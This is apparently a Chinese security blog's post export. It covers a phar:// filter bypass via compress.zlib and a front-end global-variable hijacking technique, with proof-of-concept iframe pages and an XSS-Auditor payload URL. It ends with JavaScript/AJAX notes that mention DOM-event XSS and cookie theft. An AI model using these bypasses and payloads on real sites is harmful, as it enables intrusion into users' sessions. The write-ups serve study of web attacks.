class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul>
<li>允许<code>phar : //</code>等关键词的出现</li>
<li>有反序列化环境的作用域</li>
</ul>
<h4 id="开头禁止phar-的绕过"><a href="#开头禁止phar-的绕过" class="headerlink" title="开头禁止phar://的绕过"></a>开头禁止phar://的绕过</h4><p>利用<code>compress.zlib</code>进行绕过，运行结果如下：<br><img src="https://s2.ax1x.com/2019/06/30/Z3nRfJ.png" alt="Z3nRfJ.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天不太刷手机真的学到了很多，还有不会读php源码是真的难受…Orz..看来今后的学习一定要向底层方向靠近一下了</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#2-如何创建一个合法的-Phar压缩文件" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#2-%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%90%88%E6%B3%95%E7%9A%84-Phar%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6</a></p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><a href="https://mochazz.github.io/2019/02/02/PHP反序列化入门之phar/" target="_blank" rel="noopener">https://mochazz.github.io/2019/02/02/PHP反序列化入门之phar/</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>前端全局变量劫持</title>
    <url>/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>忙完了一些杂事，学一些新的东西吧（虽说心情有点难受</p>
<h3 id="iframe之间的访问与同源关系"><a href="#iframe之间的访问与同源关系" class="headerlink" title="iframe之间的访问与同源关系"></a>iframe之间的访问与同源关系</h3><h4 id="父页面访问子页面"><a href="#父页面访问子页面" class="headerlink" title="父页面访问子页面"></a>父页面访问子页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).contentWindow; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>[<span class="number">0</span>] ; <span class="comment">// 这个比较有意思， window 是本页面的window对象，window[0] 是子页面的window对象</span></span><br></pre></td></tr></table></figure>

<h4 id="子页面访问父页面"><a href="#子页面访问父页面" class="headerlink" title="子页面访问父页面"></a>子页面访问父页面</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent;  <span class="comment">//获取上一级的window对象，如果还是iframe则是该iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.top ;   <span class="comment">// 获取最顶级容器的window对象，即，就是你打开页面的文档</span></span><br></pre></td></tr></table></figure>

<h4 id="location与frame"><a href="#location与frame" class="headerlink" title="location与frame"></a>location与frame</h4><p>如果父和子页面是同源的，那么可以通过这个window对象获取到任何你想获取的内容，包括但是不限于 document,name,location 等。但是在非同源的情况下，iframe的window对象大多数的属性都会被同源策略block掉，但是有两个属性比较特殊。</p>
<ol>
<li>frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象</li>
<li>location 可写，但是不可读。意味着父子可以相互修改彼此的 location</li>
</ol>
<p>上述内容摘自wonderkun师傅博客（</p>
<h4 id="iframe同源跨域问题"><a href="#iframe同源跨域问题" class="headerlink" title="iframe同源跨域问题"></a>iframe同源跨域问题</h4><p>iframe所加载的子页面会被同源限制，所以无法对引入进来的iframe中的元素进行操作：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//localhost/JQuery Test/exp.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">src</span>=<span class="string">'http://localhost/JQuery test/2.html'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/05/GD3Udx.png" alt="GD3Udx.png"></p>
<p>从上面的例子可以看出我们可以通过location进行同源设置来避免因为同源而被Block的情况，可成功获取name属性。</p>
<h3 id="name属性与id属性"><a href="#name属性与id属性" class="headerlink" title="name属性与id属性"></a>name属性与id属性</h3><p>name属性和id属性都可以注册为全局变量，如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDt4MD.png" alt="GDt4MD.png"></p>
<h4 id="不可覆盖变量性"><a href="#不可覆盖变量性" class="headerlink" title="不可覆盖变量性"></a>不可覆盖变量性</h4><p>对于由id和name属性创建的变量 不可对已声明的变量进行覆盖 示例如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GDd0YR.png" alt="GDd0YR.png"></p>
<p>可以看到实际的变量并没有覆盖，所以对于这种攻击手法我们需要的是一个未定义的变量的。</p>
<p>、关于更多name和id属性的特性在下一篇Dom Clobbering再说吧。</p>
<h3 id="如何获得未定义的变量"><a href="#如何获得未定义的变量" class="headerlink" title="如何获得未定义的变量"></a>如何获得未定义的变量</h3><p>从上面的内容我们可以得知我们的攻击时进行的操作必须要在此变量未定义的情况下进行（因为我们通过id或name属性无法对已定义的变量进行覆盖）。</p>
<p>利用XSS-Auditor进行变量删除（不过需要注意的时XSS-Auditor在Chrome-78beta版本已经被废除)</p>
<p>利用方式：</p>
<p>通过参数提交恶意语句，即可进行删除变量，如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xss&#x3D;&lt;script&gt;var lih3iu&#x3D;1&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>父页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">loaded</span><span class="params">(x)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        x.contentWindow.frames[<span class="number">0</span>].location = <span class="string">"http://A.com/index.html"</span>; <span class="comment">// 修改为跟A.com同源，这样在修改此iframe的name的时候就不会被同源策略block</span></span></span><br><span class="line"><span class="actionscript">        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'setting viewer...'</span>);</span></span><br><span class="line"><span class="actionscript">            x.contentWindow.frames[<span class="number">0</span>].name = <span class="string">"lih3iu"</span>; <span class="comment">// 重新定义全局变量</span></span></span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">    http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E</span></span><br><span class="line"><span class="comment">    利用chrome的filter模式去掉 VUL 的定义 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://B.com/B.html?xss=%3Cscript%3E%0A%20%20%20%20%20VUL%20=%20%22Hijack%20me%22;%0A%3C/script%3E"</span> <span class="attr">onload</span>=<span class="string">"loaded(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B.com/B.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>  <span class="attr">src</span>=<span class="string">"http://www.baidu.com"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"exploit()"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> test1=<span class="number">1</span>;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> lih3iu = <span class="string">"Hijack me"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(lih3iu);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到lih3iu变量被成功设置为一个window变量，这也是这个漏洞的局限性，只可将漏洞劫持为一个window变量，对于这个漏洞其实还是有一些问题的（比如一些同源跨域的问题，有兴趣的师傅可以私我一起讨论一下）</p>
<p><img src="https://s1.ax1x.com/2020/04/05/GrePh9.png" alt="GrePh9.png"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞/#more" target="_blank" rel="noopener">http://wonderkun.cc/2019/07/01/%E5%89%8D%E7%AB%AF%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/#more</a></p>
<p><a href="https://hpdoger.cn/2019/07/02/前端全局变量劫持/" target="_blank" rel="noopener">https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全学习笔记(一)-基础知识</title>
    <url>/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>此篇文章作为前端学习的备忘录，因为不常做开发工作，所以有些知识可能会忘掉，特此记录备忘。</p>
<h3 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h3><h4 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.forms[<span class="string">"myForm"</span>][<span class="string">"fname"</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"必须填写姓名"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;form name=<span class="string">"myForm"</span> action=<span class="string">"./index.php"</span> onsubmit=<span class="string">"return validateForm()"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">姓名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"fname"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="js输入验证"><a href="#js输入验证" class="headerlink" title="js输入验证"></a>js输入验证</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;JavaScript 能够验证输入&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">&lt;p&gt;s请输入 1 与 10 之间的数：&lt;/</span>p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input id=<span class="string">"numb"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;bsutton type=<span class="string">"button"</span> onclick=<span class="string">"myFunction()"</span>&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;p id="demo"&gt;&lt;/</span>p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x, text;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 id="numb" 的输入字段的值</span></span><br><span class="line">  x = <span class="built_in">document</span>.getElementById(<span class="string">"numb"</span>).value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 x 不是数字或小于 1 或大于 10</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isNaN</span>(x) || x &lt; <span class="number">1</span> || x &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    text = <span class="string">"输入无效"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    text = <span class="string">"输入有效"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = text;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="调用js验证的API"><a href="#调用js验证的API" class="headerlink" title="调用js验证的API"></a>调用js验证的API</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;输入数字并点击提交：&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;input id="id1" type="number" min="100" max="300" required&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;button onclick="myFunction()"&gt;提交&lt;/</span>button&gt;</span><br><span class="line"></span><br><span class="line">&lt;sp&gt;如果该数字小于 <span class="number">100</span> 或大于 <span class="number">300</span>，将显示错误消息。&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;p id="demo"&gt;&lt;/</span>p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> inpObj = <span class="built_in">document</span>.getElementById(<span class="string">"id1"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!inpObj.checkValidity()) &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = inpObj.validationMessage;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"输入有效"</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JS对象"><a href="#JS对象" class="headerlink" title="JS对象"></a>JS对象</h3><h4 id="set方法"><a href="#set方法" class="headerlink" title="set方法"></a>set方法</h4><p><img src="https://s2.ax1x.com/2019/07/16/ZbkIC4.png" alt="ZbkIC4.png"></p>
<h4 id="javascript原型继承"><a href="#javascript原型继承" class="headerlink" title="javascript原型继承"></a>javascript原型继承</h4><p>所有 JavaScript 对象都从原型继承属性和方法。</p>
<p>日期对象继承自 Date.prototype。数组对象继承自 Array.prototype。Person 对象继承自 Person.prototype。</p>
<p>Object.prototype 位于原型继承链的顶端：</p>
<p>日期对象、数组对象和 Person 对象都继承自 Object.prototype。</p>
<h4 id="javascript-call方法"><a href="#javascript-call方法" class="headerlink" title="javascript call方法"></a>javascript call方法</h4><p>call() 方法是预定义的 JavaScript 方法。</p>
<p>它可以用来调用所有者对象作为参数的方法。</p>
<p>通过 call()，您能够使用属于另一个对象的方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    fullName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">" "</span> + <span class="keyword">this</span>.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">    firstName:<span class="string">"Bill"</span>,</span><br><span class="line">    lastName: <span class="string">"Gates"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">    firstName:<span class="string">"Steve"</span>,</span><br><span class="line">    lastName: <span class="string">"Jobs"</span>,</span><br><span class="line">&#125;</span><br><span class="line">person.fullName.call(person1);  <span class="comment">// 将返回 "Bill Gates"</span></span><br></pre></td></tr></table></figure>

<p><strong>带参数的call方法</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  fullName: <span class="function"><span class="keyword">function</span>(<span class="params">city, country</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">" "</span> + <span class="keyword">this</span>.lastName + <span class="string">","</span> + city + <span class="string">","</span> + country;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  firstName:<span class="string">"Bill"</span>,</span><br><span class="line">  lastName: <span class="string">"Gates"</span></span><br><span class="line">&#125;</span><br><span class="line">person.fullName.call(person1, <span class="string">"Seattle"</span>, <span class="string">"USA"</span>);</span><br></pre></td></tr></table></figure>

<p>与<code>call</code>相似的是apply方法。</p>
<h3 id="JS-HTML-DOM"><a href="#JS-HTML-DOM" class="headerlink" title="JS HTML DOM"></a>JS HTML DOM</h3><p><img src="https://s2.ax1x.com/2019/07/16/Zbls8x.png" alt="Zbls8x.png"></p>
<p><a href="http://www.w3school.com.cn/js/js_htmldom_document.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/js/js_htmldom_document.asp</a></p>
<p>(HTML DOM文档速查)</p>
<h4 id="DOM事件"><a href="#DOM事件" class="headerlink" title="DOM事件"></a>DOM事件</h4><p>Dom事件速查<a href="http://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener">http://www.runoob.com/jsref/dom-obj-event.html</a></p>
<p>当<code>&lt;，&gt;</code>被过滤掉时我们可以用<code>DOM</code>事件去触发<code>xss</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.body.innerHTML</span><br></pre></td></tr></table></figure>

<h3 id="JS弹窗"><a href="#JS弹窗" class="headerlink" title="JS弹窗"></a>JS弹窗</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.alert(<span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.confirm(<span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.prompt(<span class="string">'xxx'</span>)   <span class="comment">//前三者都可以不带window执行</span></span><br><span class="line"></span><br><span class="line">alert(xxx)</span><br></pre></td></tr></table></figure>

<h3 id="Window-Location"><a href="#Window-Location" class="headerlink" title="Window Location"></a>Window Location</h3><p><em>window.location</em> 对象可不带 window 前缀书写。</p>
<p>一些例子：</p>
<ul>
<li>window.location.href 返回当前页面的 href (URL)</li>
<li>window.location.hostname 返回 web 主机的域名</li>
<li>window.location.pathname 返回当前页面的路径或文件名</li>
<li>window.location.protocol 返回使用的 web 协议（http: 或 https:）</li>
<li>window.location.assign 加载新文档</li>
</ul>
<p>location.href可以跳转到我们指定的页面进而获得<code>cookie</code>。</p>
<h3 id="AJAX简介"><a href="#AJAX简介" class="headerlink" title="AJAX简介"></a>AJAX简介</h3><p><strong>AJAX 并不是编程语言。AJAX 是一种从网页访问 Web 服务器的技术。AJAX 代表异步 JavaScript 和 XML。</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/16/Zbgfeg.png" alt="Zbgfeg.png"></p>
<h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p><code>xmlhttprequest</code>为<code>Ajax</code>的核心，<code>XMLHttpRequest</code>对象用于同幕后服务器交换数据。这意味着可以更新网页的部分，而不需要重新加载整个页面。</p>
<h4 id="XMLHttpRequest对象创建"><a href="#XMLHttpRequest对象创建" class="headerlink" title="XMLHttpRequest对象创建"></a><strong>XMLHttpRequest对象创建</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// code for IE6, IE5</span></span><br><span class="line">     xhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Ajax实例"><a href="#Ajax实例" class="headerlink" title="Ajax实例"></a><strong>Ajax实例</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">"button"</span> onclick=<span class="string">"loadDoc()"</span>&gt;修改内容&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span><br><span class="line">      <span class="keyword">this</span>.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"/example/js/ajax_info.txt"</span>, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/17/ZqhCFg.png" alt="ZqhCFg.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/17/ZqhiWj.png" alt="ZqhiWj.png"></p>
<h4 id="XMLHttpRequest-对象发送请求"><a href="#XMLHttpRequest-对象发送请求" class="headerlink" title="XMLHttpRequest 对象发送请求"></a><strong>XMLHttpRequest 对象发送请求</strong></h4><ul>
<li>GET请求</li>
</ul>
<p><img src="https://s2.ax1x.com/2019/07/17/Zqhr6I.png" alt="Zqhr6I.png"></p>
<p><code>True</code>代表异步，<code>False</code>则代表同步。</p>
<ul>
<li>POST请求</li>
</ul>
<p><img src="https://s2.ax1x.com/2019/07/17/Zq50sI.png" alt="Zq50sI.png"></p>
<h4 id="onreadystatechange-函数属性"><a href="#onreadystatechange-函数属性" class="headerlink" title="onreadystatechange 函数属性"></a><strong>onreadystatechange 函数属性</strong></h4><table>
<thead>
<tr>
<th>onreadystatechange</th>
<th>定义了当 readyState 属性发生改变时所调用的函数。</th>
</tr>
</thead>
<tbody><tr>
<td>readyState</td>
<td>保存了 XMLHttpRequest 的状态。0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 正在处理请求4: 请求已完成且响应已就绪</td>
</tr>
<tr>
<td>status</td>
<td>200: “OK”403: “Forbidden”404: “Page not found”如需完整列表，请访问 <a href="http://www.w3school.com.cn/tags/ref_httpmessages.asp" target="_blank" rel="noopener">Http 消息参考手册</a></td>
</tr>
<tr>
<td>statusText</td>
<td>返回状态文本（例如 “OK” 或 “Not Found”）</td>
</tr>
</tbody></table>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span><br><span class="line">            <span class="keyword">this</span>.responseText;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhttp.open(<span class="string">"GET"</span>, <span class="string">"ajax_info.txt"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhttp.send(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PS：<code>onreadystatechange</code> 被触发五次（0-4），每次 <code>readyState</code> 都发生变化。</strong></p>
<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a><strong>回调函数</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">loadDoc(<span class="string">"url-1"</span>, myFunction1);</span><br><span class="line"></span><br><span class="line">loadDoc(<span class="string">"url-2"</span>, myFunction2);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params">url, cFunction</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp;</span><br><span class="line">  xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">      cFunction(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction1</span>(<span class="params">xhttp</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// action goes here</span></span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction2</span>(<span class="params">xhttp</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// action goes here</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务器响应属性"><a href="#服务器响应属性" class="headerlink" title="服务器响应属性"></a><strong>服务器响应属性</strong></h4><table>
<thead>
<tr>
<th>responseText</th>
<th>获取字符串形式的响应数据</th>
</tr>
</thead>
<tbody><tr>
<td><strong>responseXML</strong></td>
<td><strong>获取 XML 数据形式的响应数据</strong></td>
</tr>
</tbody></table>
